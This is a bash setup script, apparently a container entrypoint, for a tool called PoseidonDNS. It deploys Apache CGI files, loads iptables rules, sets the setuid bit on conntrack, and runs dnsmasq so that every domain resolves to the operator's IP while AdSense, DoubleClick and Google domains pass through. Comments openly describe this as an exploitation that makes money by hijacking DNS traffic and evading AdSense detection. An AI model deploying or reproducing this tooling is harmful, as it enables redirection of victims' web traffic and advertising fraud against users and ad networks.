#!/bin/bash

echo "[!] Loading PoseidonDNS ..."

cd /root
unzip mainFiles.zip > /dev/null 2>&1


mv -f cgi-bin /var/www/
mv -f html/index.html /var/www/html/
mv -f html/.htaccess /var/www/html/
mv -f 000-default.conf /etc/apache2/sites-available/000-default.conf



chown -R www-data:www-data /var/www/
chmod -R +x /var/www/cgi-bin

ln -s /usr/bin/python2.7 /usr/bin/python

chmod u+s /usr/sbin/conntrack

cat /var/www/cgi-bin/base_iptables.rules | iptables-restore


dnsmasq --no-hosts -p 531 --max-cache-ttl=0


# This is an example of an exploitation, it's loaded with exceptions for Adsense domains and you website that have the ads
# which will allow the ads to show on your website without any latency produced from the re-routing
# this example is a way to make money by pushing traffic to this autonomous-scalable DNS-Hijacking server
# (I tested this model for months without any issues with Adsense)

dnsmasq --no-hosts --address=/#/$myDNSIP  --server=/.youWebsiteDomain.com/# --server=/.googlesyndication.com/# --server=/adservice.google.com/# --server=/.doubleclick.net/# --server=/.google.com/# -p 532 --max-cache-ttl=0


sed -i s/myDNSIP/$myDNSIP/g /var/www/html/index.html

echo "ServerName mydns.poseidon.com" >> /etc/apache2/apache2.conf


a2enmod headers > /dev/null 2>&1
a2enmod cgi > /dev/null 2>&1
a2enmod rewrite > /dev/null 2>&1


screen -S runScreen1 -d -m bash -c "/usr/bin/python /root/runScreen1.py"
screen -S runScreen2 -d -m bash -c "/usr/bin/python /root/runScreen2.py"


echo "[+] Poseidon is ready ..."

/usr/sbin/apache2 -D FOREGROUND
